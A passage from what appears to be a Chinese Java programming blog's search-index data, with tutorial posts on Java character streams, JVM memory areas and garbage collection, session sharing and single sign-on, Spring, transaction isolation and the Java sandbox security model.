除了特殊的CharArrayReader和StringReader，普通的Reader实际上是基于InputStream构造的，因为Reader需要从InputStream中读入字节流（byte），然后，根据编码设置，再转换为char就可以实现字符流。如果我们查看FileReader的源码，它在内部实际上持有一个FileInputStream。 既然Reader本质上是一个基于InputStream的byte到char的转换器，那么，如果我们已经有一个InputStream，想把它转换为Reader，是完全可行的。InputStreamReader就是这样一个转换器，它可以把任何InputStream转换为Reader。示例代码如下： 1234&#x2F;&#x2F; 持有InputStream:InputStream input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;);&#x2F;&#x2F; 变换为Reader:Reader reader &#x3D; new InputStreamReader(input, &quot;UTF-8&quot;); 构造InputStreamReader时，我们需要传入InputStream，还需要指定编码，就可以得到一个Reader对象。上述代码可以通过try (resource)更简洁地改写如下： 123try (Reader reader &#x3D; new InputStreamReader(new FileInputStream(&quot;src&#x2F;readme.txt&quot;), &quot;UTF-8&quot;)) &#123; &#x2F;&#x2F; TODO:&#125; 上述代码实际上就是FileReader的一种实现方式。 使用try (resource)结构时，当我们关闭Reader时，它会在内部自动调用InputStream的close()方法，所以，只需要关闭最外层的Reader对象即可。 :heavy_exclamation_mark:使用InputStreamReader，可以把一个InputStream转换成一个Reader。 小结Reader定义了所有字符输入流的超类： FileReader实现了文件字符流输入，使用时需要指定编码； CharArrayReader和StringReader可以在内存中模拟一个字符流输入。 Reader是基于InputStream构造的：可以通过InputStreamReader在指定编码的同时将任何InputStream转换为Reader。 总是使用try (resource)保证Reader正确关闭。 WriterReader是带编码转换器的InputStream，它把byte转换为char，而Writer就是带编码转换器的OutputStream，它把char转换为byte并输出。 Writer和OutputStream的区别如下： OutputStream Writer 字节流，以byte为单位 字符流，以char为单位 写入字节（0~255）：void write(int b) 写入字符（0~65535）：void write(int c) 写入字节数组：void write(byte[] b) 写入字符数组：void write(char[] c) 无对应方法 写入String：void write(String s) Writer是所有字符输出流的超类，它提供的方法主要有： 写入一个字符（0~65535）：void write(int c)； 写入字符数组的所有字符：void write(char[] c)； 写入String表示的所有字符：void write(String s)。 FileWriterFileWriter就是向文件中写入字符流的Writer。它的使用方法和FileReader类似： 12345try (Writer writer &#x3D; new FileWriter(&quot;readme.txt&quot;, StandardCharsets.UTF_8)) &#123; writer.write(&#39;H&#39;); &#x2F;&#x2F; 写入单个字符 writer.write(&quot;Hello&quot;.toCharArray()); &#x2F;&#x2F; 写入char[] writer.write(&quot;Hello&quot;); &#x2F;&#x2F; 写入String&#125; CharArrayWriterCharArrayWriter可以在内存中创建一个Writer，它的作用实际上是构造一个缓冲区，可以写入char，最后得到写入的char[]数组，这和ByteArrayOutputStream非常类似： 123456try (CharArrayWriter writer &#x3D; new CharArrayWriter()) &#123; writer.write(65); writer.write(66); writer.write(67); char[] data &#x3D; writer.toCharArray(); &#x2F;&#x2F; &#123; &#39;A&#39;, &#39;B&#39;, &#39;C&#39; &#125;&#125; StringWriterStringWriter也是一个基于内存的Writer，它和CharArrayWriter类似。实际上，StringWriter在内部维护了一个StringBuffer，并对外提供了Writer接口。 OutputStreamWriter除了CharArrayWriter和StringWriter外，普通的Writer实际上是基于OutputStream构造的，它接收char，然后在内部自动转换成一个或多个byte，并写入OutputStream。因此，OutputStreamWriter就是一个将任意的OutputStream转换为Writer的转换器： 123try (Writer writer &#x3D; new OutputStreamWriter(new FileOutputStream(&quot;readme.txt&quot;), &quot;UTF-8&quot;)) &#123; &#x2F;&#x2F; TODO:&#125; 上述代码实际上就是FileWriter的一种实现方式。这和上一节的InputStreamReader是一样的。 小结Writer定义了所有字符输出流的超类： FileWriter实现了文件字符流输出； CharArrayWriter和StringWriter在内存中模拟一个字符流输出。 使用try (resource)保证Writer正确关闭。 Writer是基于OutputStream构造的，可以通过OutputStreamWriter将OutputStream转换为Writer，转换时需要指定编码。 PrintStream和PrintWriterPrintStream是一种FilterOutputStream，它在OutputStream的接口上，额外提供了一些写入各种数据类型的方法： 写入int：print(int) 写入boolean：print(boolean) 写入String：print(String) 写入Object：print(Object)，实际上相当于print(object.toString()) … 以及对应的一组println()方法，它会自动加上换行符。 我们经常使用的System.out.println()实际上就是使用PrintStream打印各种数据。其中，System.out是系统默认提供的PrintStream，表示标准输出： 123System.out.print(12345); &#x2F;&#x2F; 输出12345System.out.print(new Object()); &#x2F;&#x2F; 输出类似java.lang.Object@3c7a835aSystem.out.println(&quot;Hello&quot;); &#x2F;&#x2F; 输出Hello并换行 System.err是系统默认提供的标准错误输出。 PrintStream和OutputStream相比，除了添加了一组print()/println()方法，可以打印各种数据类型，比较方便外，它还有一个额外的优点，就是不会抛出IOException，这样我们在编写代码的时候，就不必捕获IOException。 PrintWriterPrintStream最终输出的总是byte数据，而PrintWriter则是扩展了Writer接口，它的print()/println()方法最终输出的是char数据。两者的使用方法几乎是一模一样的： 123456789101112import java.io.*;public class Main &#123; public static void main(String[] args) &#123; StringWriter buffer = new StringWriter(); try (PrintWriter pw = new PrintWriter(buffer)) &#123; pw.println(\"Hello\"); pw.println(12345); pw.println(true); &#125; System.out.println(buffer.toString()); &#125;&#125; 小结PrintStream是一种能接收各种数据类型的输出，打印数据时比较方便： System.out是标准输出； System.err是标准错误输出。 PrintWriter是基于Writer的输出。 使用Files从Java 7开始，提供了Files和Paths这两个工具类，能极大地方便我们读写文件。 虽然Files和Paths是java.nio包里面的类，但他俩封装了很多读写文件的简单方法，例如，我们要把一个文件的全部内容读取为一个byte[]，可以这么写： 1byte[] data = Files.readAllBytes(Paths.get(\"/path/to/file.txt\")); 如果是文本文件，可以把一个文件的全部内容读取为String： 123456// 默认使用UTF-8编码读取:String content1 = Files.readString(Paths.get(\"/path/to/file.txt\"));// 可指定编码:String content2 = Files.readString(Paths.get(\"/path/to/file.txt\"), StandardCharsets.ISO_8859_1);// 按行读取并返回每行内容:List&lt;String&gt; lines = Files.readAllLines(Paths.get(\"/path/to/file.txt\")); 写入文件也非常方便： 12345678// 写入二进制文件:byte[] data = ...Files.write(Paths.get(\"/path/to/file.txt\"), data);// 写入文本并指定编码:Files.writeString(Paths.get(\"/path/to/file.txt\"), \"文本内容...\", StandardCharsets.ISO_8859_1);// 按行写入文本:List&lt;String&gt; lines = ...Files.write(Paths.get(\"/path/to/file.txt\"), lines); 此外，Files工具类还有copy()、delete()、exists()、move()等快捷方法操作文件和目录。 最后需要特别注意的是，Files提供的读写方法，受内存限制，只能读写小文件，例如配置文件等，不可一次读入几个G的大文件。读写大型文件仍然要使用文件流，每次只读写一部分文件内容。 小结对于简单的小文件读写操作，可以使用Files工具类简化代码。","categories":[],"tags":[{"name":"io","slug":"io","permalink":"https://kayleh.top/tags/io/"}]},{"title":"off-heap","slug":"堆外内存","date":"2020-12-20T05:21:38.000Z","updated":"2021-04-11T17:11:28.822Z","comments":true,"path":"off-heap/","link":"","permalink":"https://kayleh.top/off-heap/","excerpt":"","text":"堆外内存off-heap叫做堆外内存，将你的对象从堆中脱离出来序列化，然后存储在一大块内存中，这就像它存储到磁盘上一样，但它仍然在RAM中。对象在这种状态下不能直接使用，它们必须首先反序列化，也不受垃圾收集。序列化和反序列化将会影响部分性能（所以可以考虑使用FST-serialization）使用堆外内存能够降低GC导致的暂停。堆外内存不受垃圾收集器管理，也不属于老年代，新生代。","categories":[],"tags":[{"name":"jvm","slug":"jvm","permalink":"https://kayleh.top/tags/jvm/"}]},{"title":"Single point login","slug":"单点登录实现","date":"2020-12-16T22:58:05.000Z","updated":"2021-04-11T17:11:28.783Z","comments":true,"path":"single-point-login/","link":"","permalink":"https://kayleh.top/single-point-login/","excerpt":"","text":"单点登录实现分布式Session即Session共享如果我们是同一个网站，在多台服务器上部署，并且访问同一个域名，这种类似于分布式session，目前比较简单的解决方案用nginx做代理就可以实现。 在单服务器web应用中，登录用户信息只需存在该服务的session中，这是我们几年前最长见的办法。而在当今分布式系统的流行中，微服务已成为主流，用户登录由某一个单点服务完成并存储session后，在高并发量的请求（需要验证登录信息）到达服务端的时候通过负载均衡的方式分发到集群中的某个服务器，这样就有可能导致同一个用户的多次请求被分发到集群的不同服务器上，就会出现取不到session数据的情况，于是session的共享就成了一个问题。目前实现session共享的解决方案： 1）Session复制与共享 多个server之间相互同步session，这样每个server上都包含全部Service的session。 优点：tomcat等多数主流web服务器都支持此功能。 不足：session同步需要数据传输，占内网带宽，有时延。所有服务器都包含所有session数据，特别是当session中保存了较大的对象，而且对象变化较快时，性能下降显著，这种特性使得web应用的水平扩展受到了限制。 2）客户端存储法 服务端存储所有用户的session，内存占用较大，也可以将session存储到浏览器cookie中，每个端只要存储一个用户的数据了。 优点：服务端不需要存储 缺点：每次http请求都携带session，占外网带宽数据存储在端上，并在网络传输，存在泄漏、篡改、窃取等安全隐患。session存储的数据大小受cookie限制。 3）反向代理hash一致性 为了保证高可用，有多台冗余，反向代理层能不能做一些事情，让同一个用户的请求保证落在一台web服务器上呢？具体方案：反向代理使用IP或http协议中的某些业务参数来做hash，以保证同一个浏览器用户的请求落在同一个web服务器上。 优点：只需要改nginx配置，不用改应用代码，负载均衡，只要hash属性是均匀的，多台web服务器的负载是均衡的。可以支持web服务器水平扩展（session同步法是不行的，受内存限制） 缺点：如果web服务器重启，一部分session会丢失，产生业务影响，例如部分用户重新登录。如果web服务器水平扩展，rehash后session重新分布，也会有一部分用户路由不到正确的session。 4）服务端集中存储 将session存储在后端的存储层，如：数据库或者缓存。客户端每发次一次请求，都会先从存储中获取，再处理具体的业务逻辑。 优点：无安全隐患，可以水平扩，服务器重启或者扩容都不会造成session丢失。 不足：增加了一次网络调用，要修改应用代码。 总结：一般对单点登录和session共享的处理，大都选择在服务端集中存储来实现。对于db存储还是cache，肯定cache是首选。因为session读取的频率会很高，使用数据库压力会比较大。如果有session高可用需求，cache可以做高可用，但大部分情况下session可以丢失，一般也不需要考虑高可用。目前主流的现实方案是用redis实现session的存储。 单点登录如果是不同网站，我们要做到登陆A系统，同时从A系统跳转到B系统并且B系统不用登陆，B系统登录后也可以跳转到A系统并且A系统也不需要登陆，系统可以扩展到N个，这种是单点登录，并且涉及到跨域的处理，这种解决方案目前看来有Oauth2.0，JWT 等单点登录（SSO）框架，并且最好每个系统都集成单点登录才是比较好的，或者做一个认证中心，实现登陆认证中心后可以跳转到A,B系统，这时候A,B系统即可以做单点登录也可以不再做单点登陆","categories":[],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"JMM memory model","slug":"Java-memory-model内存模型","date":"2020-12-16T10:40:45.000Z","updated":"2021-04-11T17:11:28.231Z","comments":true,"path":"jmm-memory-model/","link":"","permalink":"https://kayleh.top/jmm-memory-model/","excerpt":"","text":"所有的Java开发人员可能会遇到这样的困惑？我该为堆内存设置多大空间呢？OutOfMemoryError的异常到底涉及到运行时数据的哪块区域？该怎么解决呢？其实如果你经常解决服务器性能问题，那么这些问题就会变的非常常见，了解JVM内存也是为了服务器出现性能问题的时候可以快速的了解那块的内存区域出现问题，以便于快速的解决生产故障。 先看一张图，这张图能很清晰的说明JVM内存结构布局。 Java的内存结构**：** JVM内存结构主要有三大块：堆内存、方法区和栈。堆内存是JVM中最大的一块由年轻代和老年代组成，而年轻代内存又被分成三部分，Eden空间、From Survivor空间、To Survivor空间,默认情况下年轻代按照8:1:1的比例来分配； 方法区存储类信息、常量、静态变量等数据，是线程共享的区域，为与Java堆区分，方法区还有一个别名Non-Heap(非堆)；栈又分为java虚拟机栈和本地方法栈主要用于方法的执行。 在通过一张图来了解如何通过参数来控制各区域的内存大小 控制参数-Xms设置堆的最小空间大小。 -Xmx设置堆的最大空间大小。 -XX:NewSize设置新生代最小空间大小。 -XX:MaxNewSize设置新生代最大空间大小。 -XX:PermSize设置永久代最小空间大小。 -XX:MaxPermSize设置永久代最大空间大小。 -Xss设置每个线程的堆栈大小。 没有直接设置老年代的参数，但是可以设置堆空间大小和新生代空间大小两个参数来间接控制。 老年代空间大小=堆空间大小-年轻代大空间大小 从更高的一个维度再次来看JVM和系统调用之间的关系 ** 方法区和对是所有线程共享的内存区域；而java栈、本地方法栈和程序员计数器是运行是线程私有的内存区域。 下面我们详细介绍每个区域的作用 Java堆（Heap） 对于大多数应用来说，Java堆（Java Heap）是Java虚拟机所管理的内存中最大的一块。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例都在这里分配内存。 Java堆是垃圾收集器管理的主要区域，因此很多时候也被称做“GC堆”。如果从内存回收的角度看，由于现在收集器基本都是采用的分代收集算法，所以Java堆中还可以细分为：新生代和老年代；再细致一点的有Eden空间、From Survivor空间、To Survivor空间等。 根据Java虚拟机规范的规定，Java堆可以处于物理上不连续的内存空间中，只要逻辑上是连续的即可，就像我们的磁盘空间一样。在实现时，既可以实现成固定大小的，也可以是可扩展的，不过当前主流的虚拟机都是按照可扩展来实现的（通过-Xmx和-Xms控制）。 如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError异常。 **方法区（Method Area）** 方法区（Method Area）与Java堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。虽然Java虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做Non-Heap（非堆），目的应该是与Java堆区分开来。 对于习惯在HotSpot虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为“永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为HotSpot虚拟机的设计团队选择把GC分代收集扩展至方法区，或者说使用永久代来实现方法区而已。 Java虚拟机规范对这个区域的限制非常宽松，除了和Java堆一样不需要连续的内存和可以选择固定大小或者可扩展外，还可以选择不实现垃圾收集。相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入了方法区就如永久代的名字一样“永久”存在了。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收“成绩”比较难以令人满意，尤其是类型的卸载，条件相当苛刻，但是这部分区域的回收确实是有必要的。 根据Java虚拟机规范的规定，当方法区无法满足内存分配需求时，将抛出OutOfMemoryError异常。 **程序计数器（Program Counter Register）**程序计数器（Program Counter Register）是一块较小的内存空间，它的作用可以看做是当前线程所执行的字节码的行号指示器。在虚拟机的概念模型里（仅是概念模型，各种虚拟机可能会通过一些更高效的方式去实现），字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。由于Java虚拟机的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，在任何一个确定的时刻，一个处理器（对于多核处理器来说是一个内核）只会执行一条线程中的指令。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各条线程之间的计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。 如果线程正在执行的是一个Java方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是Natvie方法，这个计数器值则为空（Undefined）。 此内存区域是唯一一个在Java虚拟机规范中没有规定任何OutOfMemoryError情况的区域。 JVM栈（JVM Stacks）与程序计数器一样，Java虚拟机栈（Java Virtual Machine Stacks）也是线程私有的，它的生命周期与线程相同。虚拟机栈描述的是Java方法执行的内存模型：每个方法被执行的时候都会同时创建一个栈帧（Stack Frame）用于存储局部变量表、操作栈、动态链接、方法出口等信息。每一个方法被调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。 局部变量表存放了编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference类型，它不等同于对象本身，根据不同的虚拟机实现，它可能是一个指向对象起始地址的引用指针，也可能指向一个代表对象的句柄或者其他与此对象相关的位置）和returnAddress类型（指向了一条字节码指令的地址）。 其中64位长度的long和double类型的数据会占用2个局部变量空间（Slot），其余的数据类型只占用1个。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。 在Java虚拟机规范中，对这个区域规定了两种异常状况：如果线程请求的栈深度大于虚拟机所允许的深度，将抛出StackOverflowError异常；如果虚拟机栈可以动态扩展（当前大部分的Java虚拟机都可动态扩展，只不过Java虚拟机规范中也允许固定长度的虚拟机栈），当扩展时无法申请到足够的内存时会抛出OutOfMemoryError异常。 本地方法栈（Native Method Stacks）本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java方法（也就是字节码）服务，而本地方法栈则是为虚拟机使用到的Native方法服务。虚拟机规范中对本地方法栈中的方法使用的语言、使用方式与数据结构并没有强制规定，因此具体的虚拟机可以自由实现它。甚至有的虚拟机（譬如Sun HotSpot虚拟机）直接就把本地方法栈和虚拟机栈合二为一。与虚拟机栈一样，本地方法栈区域也会抛出StackOverflowError和OutOfMemoryError异常。 总结1）程序计数器 几乎不占有内存。用于取下一条执行的指令。2）堆 所有通过new创建的对象的内存都在堆中分配，其大小可以通过-Xmx和-Xms来控制。堆被划分为新生代和旧生代，新生代又被进一步划分为Eden和Survivor区，最后Survivor由FromSpace和ToSpace组成，结构图如下所示：新生代。新建的对象都是用新生代分配内存，Eden空间不足的时候，会把存活的对象转移到Survivor中，新生代大小可以由-Xmn来控制，也可以用-XX:SurvivorRatio来控制Eden和Survivor的比例旧生代。用于存放新生代中经过多次垃圾回收仍然存活的对象。 3）栈 每个线程执行每个方法的时候都会在栈中申请一个栈帧，每个栈帧包括局部变量区和操作数栈，用于存放此次方法调用过程中的临时变量、参数和中间结果。4）本地方法栈 用于支持native方法的执行，存储了每个native方法调用的状态5）方法区 存放了要加载的类信息、静态变量、final类型的常量、属性和方法信息。JVM用永久代（PermanetGeneration）来存放方法区，（在JDK的HotSpot虚拟机中，可以认为方法区就是永久代，但是在其他类型的虚拟机中，没有永久代的概念，有关信息可以看周志明的书）可通过-XX:PermSize和-XX:MaxPermSize来指定最小值和最大值。","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://kayleh.top/tags/JVM/"}]},{"title":"JVM垃圾回收机制","slug":"JVM垃圾回收机制","date":"2020-12-16T09:46:57.000Z","updated":"2021-04-11T17:11:28.226Z","comments":true,"path":"jvm-gc/","link":"","permalink":"https://kayleh.top/jvm-gc/","excerpt":"","text":"GC是什么分代收集算法 次数上频繁收集Young区 Minor GC 次数上较少收集Old区 Full GC 基本不动Perm永久区 GC是发生在哪个部分 GC是发生在堆(heap)里面的 GC分几种?:one:引用计数法(被淘汰)缺点: 每次对对象赋值时均要维护引用计数器,且计数器本身也有一定的消耗 较难处理循环引用 JVM的实现一般不采用这种方式 :two:复制算法(Copying)年轻代中使用的是Minor GC,这种GC算法采用的是复制算法(Copying) 原理: 从根集合(GC Root)开始,通过Tracing从From中找到存活对象,拷贝到To中; From丶To交换身份,下次内存分配从To开始 优势:heavy_check_mark: 没有标记和清除的过程,效率高 没有内存碎片,可以利用bump-the-pointrt实现快速内存分配 劣势:heavy_multiplication_x: 需要双倍空间 :three:标记清除(Mark-Sweep)老年代一般是由标记清除或者是标记清除与标记整理的混合实现 原理 1.标记(Mark) 从根集合开始扫描,对存活的对象进行标记 2.清除(Sweep) 扫描整个内存空间,回收未被标记的对象,使用free-list记录可以区域. 优势:heavy_check_mark: 不需要额外空间 劣势:heavy_multiplication_x: 两次扫描,耗时严重 会产生内存碎片 :four:标记压缩(Mark-Compact)原理: 1.标记(Mark) 与标记-清除一样 2.压缩(Compact) 再次扫描,并往一段滑动存活对象. 优势:heavy_check_mark: 没有内存碎片,可以利用bump-the-pointrt 劣势:heavy_multiplication_x: 需要移动对象的成本 :five:标记清除压缩(Mark-Sweep-Compact)原理: 1.Mark-Sweep和Mark-Compact的结合 2.和Mark-Sweep一致,当进行多次GC后才Compact :heavy_check_mark:减少移动对象的成本","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://kayleh.top/tags/JVM/"}]},{"title":"SpringMVC work stream","slug":"SpringMVC工作流程","date":"2020-12-16T07:13:22.000Z","updated":"2021-04-11T17:11:28.436Z","comments":true,"path":"springmvc-work-stream/","link":"","permalink":"https://kayleh.top/springmvc-work-stream/","excerpt":"","text":"SpringMVC工作流程 处理模型数据方式一:将方法的返回值设置为ModelAndView 处理模型数据方式二:方法的返回值仍是String类型,在方法的入参中传入Map,Model或者ModelMap, 不管将处理器方法的返回值设置为ModelAndView还是在方法的入参传入Map,Model或者ModelMap,SpringMVC都会转换为一个ModelAndView对象.","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"Transaction isolation level","slug":"事务的隔离级别","date":"2020-12-16T06:14:51.000Z","updated":"2021-04-11T17:11:28.564Z","comments":true,"path":"Transaction-isolation-level/","link":"","permalink":"https://kayleh.top/Transaction-isolation-level/","excerpt":"","text":"事务的隔离级别事务是必须满足4个条件（ACID）：：原子性（Atomicity，或称不可分割性）、一致性（Consistency）、隔离性（Isolation，又称独立性）、持久性（Durability）。 原子性：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。 一致性：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。 隔离性：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。 持久性：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。 数据库事务并发问题假设选择有两个事务:Transaction01和Transaction02并发执行. 1)脏读 ①Transaction01将某条记录的AGE值从20修改为30. ②Transaction02读取了Transaction01更新后的值:30. ③Transaction01回滚.AGE值恢复到了20. ④Transaction02读取到的30就是一个无效的值. 2)不可重复读 ①Transaction01读取了AGE值为20. ②Transaction02将AGE值修改为30. ③Transaction01再次读取AGE值为30,和第一次读取不一致. 3)幻读 ①Transaction01读取了STUDENT表中的一部分数据 ②Transaction02向STUDENT表中插入了新的行 ③Transaction01读取的时候,多了一些新的行,感觉出现了幻觉 隔离级别 一个事务与其他事务隔离的程度称为隔离级别 1)读未提交:READ UNCOMMITTED 允许Transaction01读取Transaction02未提交的修改 2)读已提交:READ COMMITTED 要求Transaction01只能提取Transaction02已提交的修改 3)可重复读: REPEATABLE READ 确保Transaction01可以多次从一个字段中读取到相同的值,即Transaction01执行期间禁止其他事务对这个字段更新 4)串行化: SERIALIZABLE 确保Transaction01可以多次从一个表中读取到相同的行.在Transaction01执行期间,禁止其他事务对这个表进行添加,更新,删除操作.可以避免任何并发问题,但性能十分低下. 隔离级别 脏读 不可重复读 幻读.虚拟读取 未提交读 是 是 是 已提交读 否 是 是 可重复读 否 否 是 快照 否 否 否 可序列化 否 否 否","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"https://kayleh.top/tags/sql/"}]},{"title":"Spring Related","slug":"Spring的作用域","date":"2020-12-16T05:44:11.000Z","updated":"2021-04-11T17:11:28.454Z","comments":true,"path":"spring-relate/","link":"","permalink":"https://kayleh.top/spring-relate/","excerpt":"","text":"Spring相关什么是IOCIOC： Inversion of control 反转控制。 比如以前创建一个对象，需要自己主动new 一个对象，通过IOC，对象的创建交由Spring框架 创建，开发人员直接使用已经创建好的对象。 什么是DIDI： Dependency Injection 依赖注入。 通过IOC创建对象的时候，可以注入字符串甚至其他对象。 比如DAO就会注入session factory. 通常IOC和DI是紧密结合，一起使用的 什么是AOP把功能划分为核心业务功能和其他的周边辅助功能，比如日志，性能统计，事务等等。 其他的周边辅助功能可以都看作切面功能。核心功能和切面功能分别独立开发，通过面向切面编程，可以有机的把核心业务功能和切面功能根据需求结合在一起。 比如增加操作可以和事务切面结合在一起，查询操作可以和性能统计切面结合在一起。在配置方面，要配置切面，切点，并且通过aspect:config 把切面和切点结合起来。 bean的作用域 可以通过配置文件的scope属性来指定bean的作用域 singleton:默认值.当IOC容器一创建就会创建bean的实例.而且是单例的,每次得到的都是同一个. prototype:原型的.当IOC容器一创建不再实例化该bean,每次调用getBean方法时再实例化该bean,而且每次得到的不是同一个 request:每次请求实例化一个bean session:在一次会话中共享一个bean Spring支持的常用数据库事务传播属性和事务隔离级别 propagation:用来设置事务的传播行为 事务的传播行为:一个事务方法运行在了一个开启了事务的方法中时,当前方法时使用原来的事务还是开启一个新的事务 Propagation.REQUIRED:默认值,使用原来的事务 Propagation.REQUIRED_NEW:将原来的事务挂起,开启一个新的事务 isolation:用来设置事务的隔离级别 Isolation.REPEATABLE_READ:可重复读,MySQL默认的隔离级别 Isolation.READ_COMMITTED:读已提交,Oracle默认的隔离级别,开发时通常使用的隔离级别","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"Native method?","slug":"Native方法","date":"2020-12-15T08:58:42.000Z","updated":"2021-04-11T17:11:28.345Z","comments":true,"path":"Native-method/","link":"","permalink":"https://kayleh.top/Native-method/","excerpt":"","text":"Native 方法?翻看Thread.start()源码,竟然出现了无方法体的方法?? 1private native void start0(); 这里其实用到了关键字native native关键字 说明java的作用范围达不到了,回去调用底层C语言的库. 使用native关键字会进入本地方法栈,调用本地方法接口JNI(Java Native Interface) JNI的作用: 扩展Java的使用,融合不同的编程语言为Java所用 它在内存区域中专门开辟了一块标记区域: Native Method Stack,登记Native方法. 在最终执行的时候,加载本地方法库中的方法通过JNI 本地方法的使用少见. Java使用打印机,currentTimeMills( ),做外挂的Robot( )…","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://kayleh.top/tags/JVM/"}]},{"title":"沙箱安全机制","slug":"沙箱安全机制","date":"2020-12-15T08:58:23.000Z","updated":"2021-04-11T17:11:28.937Z","comments":true,"path":"Sandbox-security-mechanism/","link":"","permalink":"https://kayleh.top/Sandbox-security-mechanism/","excerpt":"","text":"什么是沙箱？ Java安全模型的核心就是Java沙箱（sandbox），什么是沙箱？沙箱是一个限制程序运行的环境。沙箱机制就是将 Java 代码限定在虚拟机(JVM)特定的运行范围中，并且严格限制代码对本地系统资源访问，通过这样的措施来保证对代码的有效隔离，防止对本地系统造成破坏。沙箱主要限制系统资源访问，那系统资源包括什么？——CPU、内存、文件系统、网络。不同级别的沙箱对这些资源访问的限制也可以不一样。 所有的Java程序运行都可以指定沙箱，可以定制安全策略。 ### java中的安全模型： 在Java中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信的。对于授信的本地代码，可以访问一切本地资源。而对于非授信的远程代码在早期的Java实现中，安全依赖于沙箱 (Sandbox) 机制。如下图所示 ![JDK1.0安全模型](D:\\Blog\\source\\_posts\\沙箱安全机制\\1095776-20180111144130504-757642373.gif) 但如此严格的安全机制也给程序的功能扩展带来障碍，比如当用户希望远程代码访问本地系统的文件时候，就无法实现。因此在后续的 Java1.1 版本中，针对安全机制做了改进，增加了安全策略，允许用户指定代码对本地资源的访问权限。如下图所示 ![JDK1.1安全模型](D:\\Blog\\source\\_posts\\沙箱安全机制\\1095776-20180111144207051-1274870859.gif) 在 Java1.2 版本中，再次改进了安全机制，增加了代码签名。不论本地代码或是远程代码，都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，来实现差异化的代码执行权限控制。如下图所示 ![JDK1.2安全模型](D:\\Blog\\source\\_posts\\沙箱安全机制\\1095776-20180111144239051-1741250711.gif) 当前最新的安全机制实现，则引入了域 (Domain) 的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域 (Protected Domain)，对应不一样的权限 (Permission)。存在于不同域中的类文件就具有了当前域的全部权限，如下图所示 ![最新的安全模型](D:\\Blog\\source\\_posts\\沙箱安全机制\\1095776-20180111144309176-1047557575.gif) 以上提到的都是基本的 Java 安全模型概念，在应用开发中还有一些关于安全的复杂用法，其中最常用到的 API 就是 doPrivileged。doPrivileged 方法能够使一段受信任代码获得更大的权限，甚至比调用它的应用程序还要多，可做到临时访问更多的资源。有时候这是非常必要的，可以应付一些特殊的应用场景。例如，应用程序可能无法直接访问某些系统资源，但这样的应用程序必须得到这些资源才能够完成功能。 ### 组成沙箱的基本组件： - 字节码校验器（bytecode verifier）：确保Java类文件遵循Java语言规范。这样可以帮助Java程序实现内存保护。但并不是所有的类文件都会经过字节码校验，比如核心类。 - 类装载器（class loader）：其中类装载器在3个方面对Java沙箱起作用 1. 它防止恶意代码去干涉善意的代码； 2. 它守护了被信任的类库边界； 3. 它将代码归入保护域，确定了代码可以进行哪些操作。 虚拟机为不同的类加载器载入的类提供不同的命名空间，命名空间由一系列唯一的名称组成，每一个被装载的类将有一个名字，这个命名空间是由Java虚拟机为每一个类装载器维护的，它们互相之间甚至不可见。 类装载器采用的机制是双亲委派模式。1. 从最内层JVM自带类加载器开始加载，外层恶意同名类得不到加载从而无法使用； 2. 由于严格通过包来区分了访问域，外层恶意的类通过内置代码也无法获得权限访问到内层类，破坏代码就自然无法生效。 - 存取控制器（access controller）：存取控制器可以控制核心API对操作系统的存取权限，而这个控制的策略设定，可以由用户指定。 - 安全管理器（security manager）：是核心API和操作系统之间的主要接口。实现权限控制，比存取控制器优先级高。 - 安全软件包（security package）：java.security下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性，包括： 1. 安全提供者 2. 消息摘要 3. 数字签名 4. 加密 5. 鉴别 说白了就是限制远程代码权限 假如一段代码： 12345public void a() &#123; b(); &#125; public void b() &#123; a(); &#125; 